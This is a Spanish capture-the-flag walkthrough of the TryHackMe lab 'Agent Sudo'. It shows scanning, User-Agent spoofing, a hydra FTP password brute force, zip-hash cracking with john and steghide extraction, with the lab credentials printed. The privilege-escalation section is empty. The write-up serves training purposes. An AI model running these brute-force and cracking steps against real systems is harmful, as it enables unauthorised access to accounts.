# Resolución de la Máquina: Agent Sudo

- **Plataforma:** TryHackMe
- **Dificultad:** Fácil
- **Fecha de resolución:** 16/06/2025
- **Sistema Operativo:** Linux


## Descripción

**Agent Sudo** es una máquina de nivel fácil diseñada para introducir a los usuarios en conceptos fundamentales de pruebas de penetración web y escalada de privilegios en sistemas Linux. Es ideal para principiantes que están dando sus primeros pasos en entornos de CTF.

Durante la resolución, el atacante debe identificar una vulnerabilidad web común que permite obtener acceso inicial al sistema. Posteriormente, se explora una sencilla pero efectiva técnica de escalada de privilegios basada en archivos SUID mal configurados.

Esta máquina es útil para practicar:

> Enumeración web y de servicios básicos

> Comprensión de inyecciones simples o ejecución remota de comandos

> Técnicas básicas de post-explotación

> Identificación de binarios con permisos indebidos en sistemas Linux  


## Enumeración

### Escaneo con Nmap

```bash
$ nmap -p- --open -sS -sV -sC -T4 -n -Pn 10.10.220.41
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-16 12:03 EDT
Nmap scan report for 10.10.220.41
Host is up (0.060s latency).
Not shown: 63608 closed tcp ports (reset), 1924 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Annoucement
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.33 seconds
```
## Intrusión
Accediendo mediante navegador al http encontraremos el siguiente mensaje:
```
Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R 
```
Para continuar es importante que entendamos el concepto de User-Agent.
El User-Agent es una cabecera HTTP que los clientes (como navegadores web, herramientas como curl, bots, etc.) envían al servidor cada vez que hacen una petición, este permite que los servidores web adapten su comportamiento en función del cliente que se conecta.

Mediante curl podremos enviar User-Agents que creamos que pueden ser propensos a existir en la web (-A "x"), con -L habilitaremos la redirección, para que en caso de que el User-Agent exista nos pueda redirigir hacia el.
`curl -A "C" -L http://10.10.156.39/`
**También podriamos haber utilizado la función responder de Burpsuite**

## Obtención de acceso
Una vez obtenido el usuario "chris" procederemos a lanzar un ataque de diccionario con hydra
```bash
$ hydra -l chris -P /home/kali/Downloads/rockyou.txt 10.10.156.39 ftp      
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-16 12:42:33
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ftp://10.10.156.39:21/
[21][ftp] host: 10.10.156.39   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-16 12:43:31
```
Una vez conectados al FTP nos descargaremos todo el contenido con el comando get.

Utilizaremos binwalk, este escanea el archivo binario buscando firmas de archivos conocidas (por ejemplo, firmas de ZIP, JPEG, gzip, squashfs, etc.) usando una base de datos interna.
```bash
$ binwalk cutie.png      

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```
Vemos que este ha detactado contenido oculto en la imágen, por lo que procederemos a extrarlo
```bash
binwalk -e cutie.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
869           0x365           Zlib compressed data, best compression

WARNING: Extractor.execute failed to run external extractor 'jar xvf '%e'': [Errno 2] No such file or directory: 'jar', 'jar xvf '%e'' might not be installed correctly
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt

WARNING: One or more files failed to extract: either no utility was found or it's unimplemented
```

Nos encontraremos con un archivo zip protegido con contraseña, ahora utilizaremos zip2john, su función es extraer hashes de archivos zip.

```bash
─$ zip2john 8702.zip > hash.txt

─$ john --wordlist=/home/kali/Downloads/rockyou.txt hash.txt

Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alien            (8702.zip/To_agentR.txt)     
1g 0:00:00:00 DONE (2025-06-16 13:01) 1.162g/s 28576p/s 28576c/s 28576C/s merlina..280690
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Veremos que obtenemos la contraseña alien, una vez descomprimido el zip nos encontraremos un txt con la siguiente información: QXJlYTUx
Al pasarlo por la web de cyberchef veremos que esta en base64 y lo decodifica como: Area51

A continuación utilizaremos steghide, una herramienta de esteganografía, que permite ocultar datos dentro de archivos multimedia (como imágenes JPEG, BMP o archivos WAV) y extraerlos posteriormente.
```bash
-$ steghide extract -sf  cute-alien.jpg -p Area51
wrote extracted data to "message.txt".
```
**-sf hace referencia al stego file y -p a la contraseña**

Obtendremos las siguientes credenciales: james - hackerrules!
Accederemos mediante ssh con estas credenciales.

## Escalada de privilegios
